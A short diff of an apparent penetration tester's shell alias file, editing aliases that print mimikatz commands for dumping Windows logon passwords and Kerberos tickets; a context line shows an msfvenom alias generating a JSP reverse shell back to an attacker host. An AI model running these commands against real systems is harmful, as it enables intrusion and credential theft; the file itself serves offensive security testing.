@@ -349,18 +349,22 @@ alias venom_war="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPOR
 #todo: impacket
 #todo: wine/gcc
 #todo: my-ftp/http/staging-area
+
+
 alias usage-mimikatz-logonpasswords='
 echo log C:\\Windows\\Temp\\mimi-creds.log
 echo privilege::debug 
 echo sekurlsa::logonpasswords
-quit
+exit
 '
 alias usage-mimikatz-ticketss='
 echo log C:\\Windows\\Temp\\mimi-tickets.log
 echo privilege::debug 
 echo sekurlsa::tickets
-quit
+exit
 '
+
+
 
 ### logstash ###
 ### zeek ###
